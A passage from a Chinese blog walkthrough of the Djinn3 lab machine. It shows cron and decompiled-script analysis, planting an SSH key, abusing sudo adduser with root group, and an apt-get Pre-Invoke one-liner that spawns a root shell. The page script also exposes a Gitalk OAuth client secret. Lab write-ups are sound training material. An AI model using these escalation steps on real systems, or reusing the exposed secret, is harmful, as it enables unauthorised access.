+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@djinn3:/opt/.tick-serv$ <span class="hljs-built_in">ls</span> -liha<br><span class="hljs-built_in">ls</span> -liha<br>total 16K<br>   140 drwxr-xr-x 2 www-data www-data 4.0K May 17  2020 .<br>524412 drwxr-xr-x 4 root     root     4.0K Jun  4  2020 ..<br>   411 -rw-r--r-- 1 root     root     2.8K May 17  2020 tickets.py<br>   449 -rwxr-xr-x 1 www-data www-data   48 May 17  2020 tickets.sh<br>www-data@djinn3:/opt/.tick-serv$ <span class="hljs-built_in">cat</span> tickets.sh<br><span class="hljs-built_in">cat</span> tickets.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br>python3 /opt/.tick-serv/tickets.py<br></code></pre></td></tr></table></figure>
+
+<p>不知道 <code>tickets.sh</code> 是开机被定时执行的还是说有别的驻留程序，使用 pspy 看看。发现了两个定时运行的程序</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3 /</span>home<span class="hljs-regexp">/saint/</span>.sync-data/syncer.py<br><span class="hljs-regexp">/bin/</span>sh -c <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3 /</span>home<span class="hljs-regexp">/saint/</span>.sync-data/syncer.py<br></code></pre></td></tr></table></figure>
+
+<p>从文件名看 <code>.syncer.cpython-38.pyc</code>，似乎和这两个定时运行的程序有关系，</p>
+<h3 id="反编译获取信息"><a href="#反编译获取信息" class="headerlink" title="反编译获取信息"></a>反编译获取信息</h3><p>反编译一下，关于 python 的反编译似乎 IDA 无能为力</p>
+<p>找了个在线网站<a target="_blank" rel="noopener" href="http://tools.bugscaner.com/decompyle/">在线pyc,pyo,python,py文件反编译，目前支持python1.5到3.6版本的反编译-在线工具 (bugscaner.com)</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf8 -*-</span><br><span class="hljs-comment">#! /usr/bin/env  3.8.0 (3413)</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-comment">#.configuration.cpython-38.pyc</span><br><span class="hljs-comment">#source path: configuration.py</span><br><span class="hljs-comment">#Compiled at: 2020-06-04 14:49:49</span><br><br><span class="hljs-keyword">import</span> os, sys, json<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> glob<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime <span class="hljs-keyword">as</span> dt<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigReader</span>:<br>    config = <span class="hljs-literal">None</span><br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">read_config</span>(<span class="hljs-params">path</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Reads the config file</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        config_values = &#123;&#125;<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>                config_values = json.load(f)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Couldn&#x27;t properly parse the config file. Please use properl&quot;</span>)<br>                sys.exit(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">finally</span>:<br>                e = <span class="hljs-literal">None</span><br>                <span class="hljs-keyword">del</span> e<br><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> config_values<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_config_path</span>():<br>        <span class="hljs-string">&quot;&quot;&quot;Set the config path</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        files = glob(<span class="hljs-string">&#x27;/home/saint/*.json&#x27;</span>)<br>        other_files = glob(<span class="hljs-string">&#x27;/tmp/*.json&#x27;</span>)<br>        files = files + other_files<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(files) &gt; <span class="hljs-number">2</span>:<br>                files = files[:<span class="hljs-number">2</span>]<br>            <span class="hljs-keyword">else</span>:<br>                file1 = os.path.basename(files[<span class="hljs-number">0</span>]).split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>                file2 = os.path.basename(files[<span class="hljs-number">1</span>]).split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>                <span class="hljs-keyword">if</span> file1[-<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;config&#x27;</span>:<br>                    <span class="hljs-keyword">if</span> file2[-<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;config&#x27;</span>:<br>                        a = dt.strptime(file1[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;%d-%m-%Y&#x27;</span>)<br>                        b = dt.strptime(file2[<span class="hljs-number">0</span>], <span class="hljs-string">&#x27;%d-%m-%Y&#x27;</span>)<br>                <span class="hljs-keyword">if</span> b &lt; a:<br>                    filename = files[<span class="hljs-number">0</span>]<br>                <span class="hljs-keyword">else</span>:<br>                    filename = files[<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">except</span> Exception:<br>            sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> filename<br></code></pre></td></tr></table></figure>
+
+<p>我们需要理解一下反编译后的代码，其中只有一个 ConfigReader 类，类中包含两个静态方法 <code>set_config_path</code> 和 <code>read_config</code></p>
+<p><code>set_config_path</code> 中检查了 <code>/home/saint/</code> 和 <code>/tmp/</code> 目录下的 <code>.json</code> 后缀的文件，但是此类文件的数量如果大于 2，会截断，只保留两个文件路径。接下来对文件路径进行判断，如果两个文件名中 <code>.json</code> 前都是 <code>.config</code> ，那么就对 <code>.config</code> 前的时间进行大小比较，较新的文件名会被返回。</p>
+<p>read_config 用于读取配置文件，按照 json 格式解析文件内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf8 -*-</span><br><span class="hljs-comment">#! /usr/bin/env  3.8.0 (3413)</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-comment">#.syncer.cpython-38.pyc</span><br><span class="hljs-comment">#source path: syncer.py</span><br><span class="hljs-comment">#Compiled at: 2020-06-01 11:32:59</span><br><br><span class="hljs-keyword">from</span> configuration <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> connectors.ftpconn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> connectors.sshconn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> connectors.utils <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Main function</span><br><span class="hljs-string">    Cron job is going to make my work easy peasy</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    configPath = ConfigReader.set_config_path()<br>    config = ConfigReader.read_config(configPath)<br>    connections = checker(config)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;FTP&#x27;</span> <span class="hljs-keyword">in</span> connections:<br>        ftpcon(config[<span class="hljs-string">&#x27;FTP&#x27;</span>])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;SSH&#x27;</span> <span class="hljs-keyword">in</span> connections:<br>            sshcon(config[<span class="hljs-string">&#x27;SSH&#x27;</span>])<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;URL&#x27;</span> <span class="hljs-keyword">in</span> connections:<br>                sync(config[<span class="hljs-string">&#x27;URL&#x27;</span>], config[<span class="hljs-string">&#x27;Output&#x27;</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<p><code>.syncer.cpython-38.pyc</code> 反汇编后的代码是对 <code>.configuration.cpython-38.pyc</code> 的方法进行调用，按 json 格式读取文件后，根据配置文件中的键值来进行判断，从而执行不同的操作</p>
+<h3 id="写入-ssh-公钥"><a href="#写入-ssh-公钥" class="headerlink" title="写入 ssh 公钥"></a>写入 ssh 公钥</h3><p>此处需要一点猜测，sync 是同步的意思，而这里将配置文件中的 URL 和 Output 进行了读取，大概率是远程下载文件后，输出到 Output 中指定的目录。这里我们或许可以尝试将 ssh 公钥放入用户家目录下的 <code>.ssh</code> 目录中，从而实现远程登录</p>
+<p>根据之前 pspy 收集到的定时任务的信息，定时任务是由 saint 用户执行的，那我们的目标就是写入到 saint 用户家目录中。在这之前我们需要本地生成公私钥对</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/djinn3]<br>└─$ ssh-keygen<br>Generating public/private rsa key pair.<br>Enter file <span class="hljs-keyword">in</span> <span class="hljs-built_in">which</span> to save the key (/home/kali/.ssh/id_rsa): /home/kali/Documents/djinn3/saint<br>Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase): <br>Enter same passphrase again: <br>Your identification has been saved <span class="hljs-keyword">in</span> /home/kali/Documents/djinn3/saint<br>Your public key has been saved <span class="hljs-keyword">in</span> /home/kali/Documents/djinn3/saint.pub<br>The key fingerprint is:<br>SHA256:wGb18AaCNifFFn7lsk/NRrJIs5ZIIFLmffQoY4M2wjg kali@kali<br>The key<span class="hljs-string">&#x27;s randomart image is:</span><br><span class="hljs-string">+---[RSA 3072]----+</span><br><span class="hljs-string">|..+ .+=.+ .      |</span><br><span class="hljs-string">|o+ +==+= B       |</span><br><span class="hljs-string">|E.=.*=X * * .    |</span><br><span class="hljs-string">| + o O = O *     |</span><br><span class="hljs-string">|      . S o +    |</span><br><span class="hljs-string">|       . o .     |</span><br><span class="hljs-string">|          .      |</span><br><span class="hljs-string">|                 |</span><br><span class="hljs-string">|                 |</span><br><span class="hljs-string">+----[SHA256]-----+</span><br></code></pre></td></tr></table></figure>
+
+<p>接下来我们需要修改公钥的文件名为 <code>authorized_keys</code> 详细的过程可以看看<a target="_blank" rel="noopener" href="http://zeo.cool/2021/10/13/%E6%97%A0%E5%AF%86%E7%A0%81Linux%E4%B8%BB%E6%9C%BA%E5%88%A9%E7%94%A8%E5%85%AC%E9%92%A5%E7%9B%B4%E6%8E%A5%E8%BF%9E%E6%8E%A5/">无密码Linux主机利用公钥直接连接 | Zeo’s Security Lab</a></p>
+<p><img src="/pic/ca41c07055b623e65acfd8f6b109abaa_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Documents/djinn3]<br>└─$ ssh -i saint saint@192.168.1.106<br>Last login: Mon Jun  1 22:04:51 2020 from 192.168.1.107<br>saint@djinn3:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> saint on djinn3:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User saint may run the following commands on djinn3:<br>    (root) NOPASSWD: /usr/sbin/adduser, !/usr/sbin/adduser * sudo, !/usr/sbin/adduser * admin<br>saint@djinn3:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:34:39:41 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.1.106/24 brd 192.168.1.255 scope global dynamic eth0<br>       valid_lft 539sec preferred_lft 539sec<br>    inet6 fe80::a00:27ff:fe34:3941/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>saint@djinn3:~$ <span class="hljs-built_in">uname</span> -a<br>Linux djinn3 4.15.0-101-generic <span class="hljs-comment">#102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br>saint@djinn3:~$ <span class="hljs-built_in">id</span><br>uid=1000(saint) gid=1002(saint) <span class="hljs-built_in">groups</span>=1002(saint)<br></code></pre></td></tr></table></figure>
+
+<h3 id="adduser"><a href="#adduser" class="headerlink" title="adduser"></a>adduser</h3><p><code>sudo -l</code> 发现了特殊的权限，但是限制了不允许在 adduser 后面添加 root 和 admin，看看 <code>-h</code> 有什么别的可利用的点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">saint@djinn3:~$ sudo /usr/sbin/adduser -h<br>adduser [--home DIR] [--shell SHELL] [--no-create-home] [--uid ID]<br>[--firstuid ID] [--lastuid ID] [--gecos GECOS] [--ingroup GROUP | --gid ID]<br>[--disabled-password] [--disabled-login] [--add_extra_groups]<br>[--encrypt-home] USER<br>   Add a normal user<br><br>adduser --system [--home DIR] [--shell SHELL] [--no-create-home] [--uid ID]<br>[--gecos GECOS] [--group | --ingroup GROUP | --gid ID] [--disabled-password]<br>[--disabled-login] [--add_extra_groups] USER<br>   Add a system user<br><br>adduser --group [--gid ID] GROUP<br>addgroup [--gid ID] GROUP<br>   Add a user group<br><br>addgroup --system [--gid ID] GROUP<br>   Add a system group<br><br>adduser USER GROUP<br>   Add an existing user to an existing group<br><br>general options:<br>  --quiet | -q      don<span class="hljs-string">&#x27;t give process information to stdout</span><br><span class="hljs-string">  --force-badname   allow usernames which do not match the</span><br><span class="hljs-string">                    NAME_REGEX[_SYSTEM] configuration variable</span><br><span class="hljs-string">  --extrausers      uses extra users as the database</span><br><span class="hljs-string">  --help | -h       usage message</span><br><span class="hljs-string">  --version | -v    version number and copyright</span><br><span class="hljs-string">  --conf | -c FILE  use FILE as configuration file</span><br></code></pre></td></tr></table></figure>
+
+<p>尝试了直接创建一个 uid 为 0 的用户，失败。那考虑 guid 等于 0 呢？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">saint@djinn3:~$ sudo /usr/sbin/adduser --gid 0 wh0am1<br>Adding user `wh0am1<span class="hljs-string">&#x27; ...</span><br><span class="hljs-string">Adding new user `wh0am1&#x27;</span> (1003) with group `root<span class="hljs-string">&#x27; ...</span><br><span class="hljs-string">Creating home directory `/home/wh0am1&#x27;</span> ...<br>Copying files from `/etc/skel<span class="hljs-string">&#x27; ...</span><br><span class="hljs-string">Enter new UNIX password: </span><br><span class="hljs-string">Retype new UNIX password: </span><br><span class="hljs-string">passwd: password updated successfully</span><br><span class="hljs-string">Changing the user information for wh0am1</span><br><span class="hljs-string">Enter the new value, or press ENTER for the default</span><br><span class="hljs-string">        Full Name []: </span><br><span class="hljs-string">        Room Number []: </span><br><span class="hljs-string">        Work Phone []: </span><br><span class="hljs-string">        Home Phone []: </span><br><span class="hljs-string">        Other []: </span><br><span class="hljs-string">Is the information correct? [Y/n]</span><br></code></pre></td></tr></table></figure>
+
+<p>切换用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">saint@djinn3:~$ su wh0am1<br>Password: <br>wh0am1@djinn3:/home/saint$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> wh0am1: <br>Sorry, user wh0am1 may not run sudo on djinn3.<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/18a5d134348ba2d8c72c8894e4c108d6_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>linpeas.sh</code> 收集到一条特别高亮的信息，<code>jason</code> 用户可使用 sudo 命令并输入密码来提高权限使用 <code>/usr/bin/apt-get</code> 命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">wh0am1@djinn3:/tmp$ <span class="hljs-built_in">ls</span> -alih /home<br>total 24K<br>393218 drwxr-xr-x  6 root   root  4.0K Oct 25 17:27 .<br>     2 drwxr-xr-x 23 root   root  4.0K Jun  1  2020 ..<br>393715 drwxr-x---  2 jack   jack  4.0K Jun  4  2020 jack<br>394234 drwxr-x---  2 mzfr   mzfr  4.0K May 17  2020 mzfr<br>405476 drwxr-x---  7 saint  saint 4.0K Jun  4  2020 saint<br>393770 drwxr-xr-x  4 wh0am1 root  4.0K Oct 25 17:37 wh0am1<br></code></pre></td></tr></table></figure>
+
+<h3 id="新建-jason-用户"><a href="#新建-jason-用户" class="headerlink" title="新建 jason 用户"></a>新建 jason 用户</h3><p><code>jason</code> 用户不存在，那就可以来尝试新建这样一个用户</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elixir">saint<span class="hljs-variable">@djinn3</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo /usr/sbin/adduser --gid <span class="hljs-number">0</span> jason<br>saint<span class="hljs-variable">@djinn3</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>su jason<br><span class="hljs-symbol">Password:</span> <br>jason<span class="hljs-variable">@djinn3</span><span class="hljs-symbol">:/home/saint</span><span class="hljs-variable">$ </span>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> <span class="hljs-symbol">jason:</span> <br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> jason on <span class="hljs-symbol">djinn3:</span><br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span><br><br><span class="hljs-title class_">User</span> jason may run the following commands on <span class="hljs-symbol">djinn3:</span><br>    (root) <span class="hljs-symbol">PASSWD:</span> /usr/bin/apt-get<br></code></pre></td></tr></table></figure>
+
+<h3 id="sudo-apt-get-提权"><a href="#sudo-apt-get-提权" class="headerlink" title="sudo apt-get 提权"></a>sudo apt-get 提权</h3><p>查找 <code>gtfobins</code> 找到了几种手法</p>
+<p><img src="/pic/9e9ec403e9a91065b512c2969247bff3_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>尝试使用 a 失败，尝试使用 c 成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">jason@djinn3:/home/saint$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls</span><br>proof.sh<br><span class="hljs-comment"># ./proof.sh    </span><br>    _                        _             _ _ _ <br>   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |<br>  / _ \ | <span class="hljs-string">&#x27;_ ` _ \ / _` |_  / | &#x27;</span>_ \ / _` | | | |<br> / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|<br>/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)<br>                                     |___/       <br>djinn-3 pwned...<br>__________________________________________________________________________<br><br>Proof: VGhhbmsgeW91IGZvciB0cnlpbmcgZGppbm4zID0K<br>Path: /root<br>Date: Wed Oct 25 17:46:03 IST 2023<br>Whoami: root<br>__________________________________________________________________________<br><br>By @0xmzfr<br><br>Special thanks to @DCAU7 <span class="hljs-keyword">for</span> his <span class="hljs-built_in">help</span> on Privilege escalation process<br>And also Thanks to my fellow teammates <span class="hljs-keyword">in</span> @m0tl3ycr3w <span class="hljs-keyword">for</span> betatesting! :-)<br><br>If you enjoyed this <span class="hljs-keyword">then</span> consider donating (https://blog.mzfr.me/support/)<br>so I can <span class="hljs-built_in">continue</span> to make these kind of challenges.<br></code></pre></td></tr></table></figure>
+
+<p>成功</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台靶机最大的收获是关于模板注入的内容，趁着这次机会彻底了解了模板注入的基础，并总结了笔记。再一个，对于一些内容的敏感度是不足的，比如这里的 <code>guest</code> ，我完全没有意识到可能是用户名和密码，以及关于 pyc 文件反编译后的代码，这部分的代码读起来不够有耐心，没构建起关于这方面的攻击思路。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Djinn3 靶机</div>
+      <div>https://i3eg1nner.github.io/2023/10/02e466a6bb9b.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年10月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/5bd55cd41555.html" title="SSTI 模板注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SSTI 模板注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/7f06b71ac96b.html" title="CyberSploit_2靶机">
+                        <span class="hidden-mobile">CyberSploit_2靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '941ec6e29f0bfae0fc3cc6889ac7547f'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
